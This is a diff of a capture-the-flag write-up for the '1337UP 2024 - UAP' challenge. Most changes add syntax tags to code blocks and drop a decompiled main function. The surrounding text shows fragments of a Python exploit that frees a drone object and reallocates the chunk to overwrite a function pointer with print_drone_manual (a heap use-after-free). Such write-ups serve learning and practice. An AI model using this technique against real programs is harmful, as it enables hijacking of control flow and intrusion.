@@ -1,6 +1,6 @@
 # 1337UP 2024 - UAP
 
-```
+```bash
 [*] '/---/drone'
     Arch:       amd64-64-little
     RELRO:      Partial RELRO
@@ -15,42 +15,7 @@
 
 These were obtained with Ghidra after removing irrelevant bits and renaming/retyping.
 
-```
-int main(void)
-
-{
-  //...
-  int choice;
-  //...
-  
-  do {
-    menu();
-    __isoc99_scanf(&DAT_00400e1d,&choice);
-    switch(choice) {
-    default:
-      puts("Invalid option. Try again.");
-      break;
-    case 1:
-      deploy_drone();
-      break;
-    case 2:
-      retire_drone();
-      break;
-    case 3:
-      start_drone_route();
-      break;
-    case 4:
-      enter_drone_route();
-      break;
-    case 5:
-                    /* WARNING: Subroutine does not return */
-      exit(0);
-    }
-  } while( true );
-}
-```
-
-```
+```c
 void deploy_drone(void)
 
 {
@@ -77,7 +42,7 @@ void deploy_drone(void)
 }
 ```
 
-```
+```c
 void retire_drone(void)
 
 {
@@ -102,7 +67,7 @@ void retire_drone(void)
 }
 ```
 
-```
+```c
 void start_drone_route(void)
 
 {
@@ -125,7 +90,7 @@ void start_drone_route(void)
 }
 ```
 
-```
+```c
 void enter_drone_route(void)
 
 {
@@ -138,7 +103,7 @@ void enter_drone_route(void)
 }
 ```
 
-```
+```c
 void end_route(Drone *d)
 
 {
@@ -218,7 +183,7 @@ Now, we can write over the data stored in the drone, specifically the functions!
 
 Let's start with deploying the drone:
 
-```
+```python
 r = Pwn(PROG, conn='uap.ctf.intigriti.io 1340')
 
 r.sla(b'option: ', b'1')
@@ -245,7 +210,7 @@ pwndbg> x/6gx 0x603ab0
 ```
 
 Next, we retire the drone.
-```
+```python
 r.sla(b'option: ', b'2')
 r.sla(b'retire: ', b'1')
 ```
@@ -270,7 +235,7 @@ tcachebins
 
 Now, when we call enter_drone_route(), it will take the place of the freed chunk. Write over start_route to now point to print_drone_manual.
 
-```
+```python
 r.sla(b'option: ', b'4')
 
 pay = b'A' * 16
@@ -279,7 +244,7 @@ r.sla(b'data: ', pay)
 ```
 
 Now, just trigger the call by start_drone_route().
-```
+```bash
 [*] '/-/drone'
     Arch:       amd64-64-little
     RELRO:      Partial RELRO
